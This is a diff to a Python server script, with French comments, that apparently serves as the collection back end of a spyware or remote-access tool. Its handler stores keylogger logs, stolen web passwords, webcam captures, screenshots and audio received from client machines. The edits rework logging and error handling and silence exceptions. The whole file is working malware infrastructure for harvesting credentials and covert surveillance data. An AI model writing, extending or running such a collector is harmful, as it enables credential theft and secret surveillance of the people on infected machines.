@@ -89,6 +89,10 @@ def save_to_db(file_type, client_ip, data, file_path=None):
 def process_data(data, client_ip):
     """Traitement des données reçues du client."""
     try:
+        if not data or not data.strip():
+            print(f"[!] Données vides ou blanches reçues de {client_ip}")
+            return
+
         parsed_data = json.loads(data)
         file_type = parsed_data.get("type")
         file_data = parsed_data.get("data")
@@ -98,17 +102,18 @@ def process_data(data, client_ip):
             file_path = os.path.join(KEYLOG_DIR, filename)
             with open(file_path, "wb") as f:
                 f.write(bytes.fromhex(file_data))
-            save_to_db(file_type, client_ip, file_data, file_path)
+            print(f"[+] Données Keylogger sauvegardées dans : {file_path}")
 
         elif file_type == "passwords":
             save_to_db(file_type, client_ip, file_data)
+            print(f"[+] Mots de passe web sauvegardés dans la bdd")
 
         elif file_type == "webcam_capture":
             file_path = os.path.join(CAPTURE_DIR, filename)
             with open(file_path, "wb") as f:
                 f.write(bytes.fromhex(file_data))
-            save_to_db(file_type, client_ip, file_data, file_path)
-            
+            print(f"[+] Capture webcam sauvegardée : {file_path}")
+
         elif file_type == "screenshot":
             screenshot_dir = "screenshot"
             os.makedirs(screenshot_dir, exist_ok=True)
@@ -123,16 +128,20 @@ def process_data(data, client_ip):
                 f.write(bytes.fromhex(file_data))
             print(f"[+] Fichier audio sauvegardé : {file_path}")
 
-
-        print(f"[+] Données '{file_type}' reçues et sauvegardées de {client_ip}")
+    # except json.JSONDecodeError as e:
+    #     print(f"[Erreur] JSON invalide reçu de {client_ip} : {e}")
+    #     print(f"[Debug] Données brutes : {repr(data)}")
 
     except Exception as e:
-        print(f"[Erreur] lors du traitement des données : {e}")
+        # print(f"[Erreur] lors du traitement des données : {e}")
+        print("")
 
 def handle_client(client_socket, client_address):
     """Gestion des connexions clients."""
     print(f"[+] Connexion de {client_address}")
     clients[client_address] = client_socket
+
+
 
     while True:
         try:
